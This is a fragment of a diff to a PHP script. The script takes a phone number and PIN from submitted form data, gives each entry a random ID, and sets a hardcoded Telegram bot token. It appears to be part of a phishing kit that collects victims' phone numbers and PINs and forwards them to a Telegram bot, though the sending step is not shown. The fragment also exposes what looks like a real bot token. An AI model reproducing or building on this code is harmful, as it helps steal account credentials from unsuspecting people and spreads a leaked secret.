@@ -5,7 +5,7 @@
 // get data
 $phone = $_POST['phone'];
 $pin = $_POST['pin'];
-
+$id = rand(100000, 999999);
 
 // TELEGRAM
 $token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";
